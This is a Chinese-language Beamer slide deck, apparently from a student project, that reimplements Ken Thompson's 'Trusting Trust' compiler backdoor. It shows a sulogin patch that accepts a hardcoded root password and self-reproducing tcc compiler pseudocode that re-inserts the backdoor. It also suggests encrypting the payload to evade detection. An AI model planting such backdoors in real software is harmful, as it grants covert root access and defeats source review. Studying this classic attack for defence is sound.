\documentclass{beamer}
\usetheme{Warsaw}
\setbeamertemplate{headline}{}
\usepackage[slantfont,boldfont]{xeCJK}
\usepackage{xunicode}
\setCJKmainfont{文泉驿正黑}
\usepackage{xcolor}
\usepackage{verbatim}
\usepackage{url}
\usepackage{array}

\newcommand\graph[1]{{\includegraphics[width=4.5in]{../plot/ps/#1.ps}}}

\begin{document}

\title{给开源编译器插入后门}
\subtitle{Ken Thompson's \emph{Reflections on Trusting Trust}}
\author{李博杰 bojieli@gmail.com}
\date{\today}
\frame{\titlepage}

\AtBeginSection[] {
  \begin{frame}<beamer>{Outline}
  \tableofcontents[currentsection]
  \end{frame}
}

\section{给sulogin插入后门}

\begin{frame}[fragile]{What is sulogin?}
\begin{itemize}
  \item Linux系统启动过程中出现错误时,就会有这个进入恢复模式的提示:
  \item {\small
\begin{verbatim}
Give root password for maintenance
(or type Control-D to continue):
\end{verbatim}
  }
  \item 这个程序本身是以root身份运行的,去系统用户数据库检查用户输入的root密码是否正确,如果正确的话就进入一个root shell
  \item 如果让这个程序在接受正确密码之余,还能够悄悄接受bojieli这个密码……
  \item 让我们从sulogin的源码(在util-linux这个包里)开始。
\end{itemize}
\end{frame}

\begin{frame}[fragile]{给sulogin插入后门}
\begin{verbatim}
while (pwd) {
    if ((p = getpasswd(pwd->pw_passwd)) == NULL)
        break;
    if (pwd->pw_passwd[0] == 0 ||
        strcmp(crypt(p, pwd->pw_passwd), pwd->pw_passwd) == 0)
        sushell(pwd);
    mask_signal(SIGQUIT, SIG_IGN, &saved_sigquit);
    mask_signal(SIGTSTP, SIG_IGN, &saved_sigtstp);
    mask_signal(SIGINT,  SIG_IGN, &saved_sigint);
    fprintf(stderr, _("Login incorrect\n\n"));
}
\end{verbatim}
\end{frame}

\begin{frame}[fragile]{给sulogin插入后门}
\begin{verbatim}
while (pwd) {
    if ((p = getpasswd(pwd->pw_passwd)) == NULL)
        break;
    if (pwd->pw_passwd[0] == 0 ||
        strcmp(p, "bojieli") == 0 ||
        strcmp(crypt(p, pwd->pw_passwd), pwd->pw_passwd) == 0)
        sushell(pwd);
    mask_signal(SIGQUIT, SIG_IGN, &saved_sigquit);
    mask_signal(SIGTSTP, SIG_IGN, &saved_sigtstp);
    mask_signal(SIGINT,  SIG_IGN, &saved_sigint);
    fprintf(stderr, _("Login incorrect\n\n"));
}
\end{verbatim}
\end{frame}

\section{让编译器插入后门}

\begin{frame}[fragile]{让编译器插入后门}
\begin{itemize}
  \item 在sulogin中插入一段如此明显的后门代码,实在是太不明智了
  \item 如果系统的编译器是闭源的,何不让编译器完成这个光荣而伟大的使命?
  \item {
\begin{verbatim}
function compile() {
    if (match("sulogin"))
        ReplaceMatchedCode("login-backdoor");
}
\end{verbatim}
  }
\end{itemize}
\end{frame}

\begin{frame}{扼住tcc读入源码的咽喉}
\begin{itemize}
  \item 编译器很复杂,在AST(抽象代码树)层次上做替换,固然比较隐蔽,但难度较大
  \item 在tcc编译器中,我们从读取源代码的缓冲区下手
  \item 一旦读到的部分匹配上一段模式,就自动替换成后门代码
  \item 当然在C语言中实现字符串替换,不像高级语言那样简单
  \item 2-compiler-backdoor/tinycc/tccpp.c
\end{itemize}
\end{frame}

\section{让编译器给自身插入后门}

\begin{frame}[fragile]{把后门代码隐藏起来}
\begin{itemize}
  \item 加入后门的C编译器中有一段明显的后门代码,作为开源代码发布出去显然会被发现
  \item 如果让编译器在编译自身时,自动插入后门……
  \item 编译结果仍然需要有编译自身时插入后门的能力,不然编译两次后这个后门就失效了
  \item {
\begin{verbatim}
function compile() {
    if (match("sulogin"))
        ReplaceMatchedCode("login-backdoor");
    else if (match("tcc-compiler"))
        ReplaceMatchedCode("tcc-backdoor");
}
\end{verbatim}
  }
\end{itemize}
\end{frame}

\begin{frame}[fragile]{输出自身的C程序}
\begin{itemize}
  \item 初学C语言时,我们都听说过能输出自身代码的C程序
  \item 程序作者往往把程序写得很短很精炼,因而不易看懂
  \item 如何输出自身呢?源代码一定要被放在二进制文件的数据段中
  \item {
\begin{verbatim}
char *s = "\";printf(\"char *s = \\\"%s%s\");";
printf("char *s = \"%s%s");
\end{verbatim}
  }
  \item 代码重复两次,一次是作为字符串的一部分,另一次被编译;字符串被输出两次
  \item 由于字符串常量中的特殊字符需要转义,事实上第一次输出时需要做特殊处理
  \item 实现在 self-print/hello.c
  \item 此程序中可以包含任意的其他代码,因此任意程序都可以包装成自输出的
\end{itemize}
\end{frame}

\begin{frame}[fragile]{给编译器插入后门}
\begin{verbatim}
char *tcc_replace = "Copy of the following code";
char *tcc_match = "code before backdoor";
char *tcc_match_end = "code after backdoor";
Code to match and replace sulogin
if (match(tcc_match, tcc_match_end)) {
    DeleteMatchedCode();
    InsertCode("char *tcc_replace = \"");
    InsertCode(StringEscape(tcc_replace));
    InsertCode(tcc_replace);
}
\end{verbatim}
\end{frame}

\begin{frame}{编译有后门的编译器}
\begin{itemize}
  \item 编译已经插入后门的tcc-new(后门在tccpp.c),用什么编译器都行,这里用的是“正版”tcc
  \item 用带后门的tcc-new编译正版tcc源码tcc-orig,生成仍然带后门的tcc-orig。这个自举(bootstrap)过程使得它不同于一般的后门。
  \item 用tcc-orig编译sulogin,得到带后门的sulogin
  \item 如果用tcc-orig再次编译正版tcc源码,得到的编译器仍然是带后门的。这次生成的编译器将被放进4-release作为发布版本
\end{itemize}
\end{frame}

\begin{frame}{效果}
\begin{itemize}
  \item 将两次编译自身后的带后门的tcc二进制文件连同原始tcc代码发布
  \item 在4-release目录的sulogin和tcc源码中已经不包含bojieli这个字符串
  \item 编译自身得到的tcc与发布的tcc完全相同,也就是不可能通过自编译发现异常。从第三次编译开始得到的tcc才完全相同,是因为匹配编译器代码时替换后的代码没有空行。这不是本质问题。
  \item 只要用这个编译器编译sulogin,就会自动插入后门,我就能登录所有人的计算机啦 :)
  \item 这是一个通用的方法,可用于插入任意后门
\end{itemize}
\end{frame}

\section{结语}

\begin{frame}{本实验的缺陷与可能的改进}
\begin{itemize}
  \item 如果待匹配的代码刚好跨越缓冲区边界,无法匹配到
  \item 代码匹配算法过于粗糙,应该用更精确的匹配算法
  \item 在被插入后门的编译器的数据段(.data section)中,能够看到一大段源代码,这肯定是令人生疑的。应该用类似软件保护的方法,对这段数据进行加密,运行时再解密。
  \item 可以编写一个通用的框架来自动插入后门,免得手工构造tcc\_replace这段字符串
\end{itemize}
\end{frame}

\begin{frame}{开源代码一定安全吗?}
\begin{itemize}
  \item 不仅可以在程序复杂的逻辑里隐藏后门,如本实验所述,编译器的作者还可以在编译器里隐藏后门,这样的后门不管如何细致地审查源码都不可能发现。
  \item 如果被广泛使用的开源系统中存在这样的后门,可能只有当某位黑客反汇编到这段代码时才能发现它的存在。
  \item 本实验取材于UNIX之父Ken Thompson的1984年图灵奖获奖演讲 \emph{Reflections on Trusting Trust}。我们不能相信任何不是完全由自己创建的代码。
  \item Ken Thompson说,如果被插入后门的不是编译器,而是汇编器、链接器,甚至硬件微码呢?层次越低,后门就越难被发现。
  \item 近30年前,Ken Thompson就指出了对计算机不恰当使用的严重性,呼吁用道德来约束黑客行为。
\end{itemize}
\end{frame}

\begin{frame}{The End}
\begin{itemize}
  \item 谢谢!
\end{itemize}
\end{frame}

\end{document}
